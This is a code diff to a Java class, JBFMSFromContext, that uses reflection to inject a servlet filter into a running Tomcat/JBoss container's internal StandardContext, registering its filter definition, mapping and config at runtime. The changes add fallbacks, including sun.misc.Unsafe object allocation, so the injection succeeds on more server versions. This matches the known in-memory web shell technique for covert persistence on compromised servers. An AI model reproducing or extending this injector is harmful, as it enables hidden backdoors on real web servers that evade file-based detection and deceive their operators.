@@ -55,8 +55,13 @@ public class JBFMSFromContext implements Filter {
 							new Object[]{0, filterName, pattern, DispatcherType.REQUEST});
 				}
 			} catch (Exception ignored) {
-				Object standardContext = getFieldValue(getFieldValue(getMethodAndInvoke(
-						req, "getServletContext", new Class[]{}, new Object[]{}), "context"), "context");
+				Object standardContext = null;
+				Object servletContext  = getMethodAndInvoke(req, "getServletContext", new Class[]{}, new Object[]{});
+				if (servletContext != null) {
+					standardContext = getFieldValue(getFieldValue(servletContext, "context"), "context");
+				} else {
+					standardContext = getFieldValue(getFieldValue(req, "request"), "context");
+				}
 				Class contextClass = null;
 				try {
 					contextClass = standardContext.getClass().getSuperclass();
@@ -96,12 +101,23 @@ public class JBFMSFromContext implements Filter {
 				fieldMaps.set(standardContext, newMaps);
 
 				getMethodAndInvoke(standardContext, "addFilterMap", new Class[]{filterMapClass}, new Object[]{filterMap});
-				Class       config      = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
-				Class       conClass    = Class.forName("org.apache.catalina.Context");
-				Constructor constructor = config.getDeclaredConstructor(conClass, filterDefClass);
-				constructor.setAccessible(true);
-				Object apacheConfig = constructor.newInstance(standardContext, filterDef);
-				Field  field        = config.getDeclaredField("filter");
+
+				Class  config       = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+				Object apacheConfig = null;
+
+				try {
+					Class       conClass    = Class.forName("org.apache.catalina.Context");
+					Constructor constructor = config.getDeclaredConstructor(conClass, filterDefClass);
+					constructor.setAccessible(true);
+					apacheConfig = constructor.newInstance(standardContext, filterDef);
+				} catch (Exception neverMind) {
+					apacheConfig = createInstanceUnsafely(config);
+					Field def = config.getDeclaredField("filterDef");
+					def.setAccessible(true);
+					def.set(apacheConfig, filterDef);
+				}
+
+				Field field = config.getDeclaredField("filter");
 				field.setAccessible(true);
 				field.set(apacheConfig, filter);
 				filterConfigs.put(filterName, apacheConfig);
@@ -164,5 +180,12 @@ public class JBFMSFromContext implements Filter {
 		}
 		f.setAccessible(true);
 		return f.get(obj);
+	}
+
+	public static Object createInstanceUnsafely(Class<?> clazz) throws Exception {
+		Class unsafeClass    = Class.forName("sun.misc.Unsafe");
+		Field theUnsafeField = unsafeClass.getDeclaredField("theUnsafe");
+		theUnsafeField.setAccessible(true);
+		return getMethodAndInvoke(theUnsafeField.get(null), "allocateInstance", new Class[]{Class.class}, new Object[]{clazz});
 	}
 }
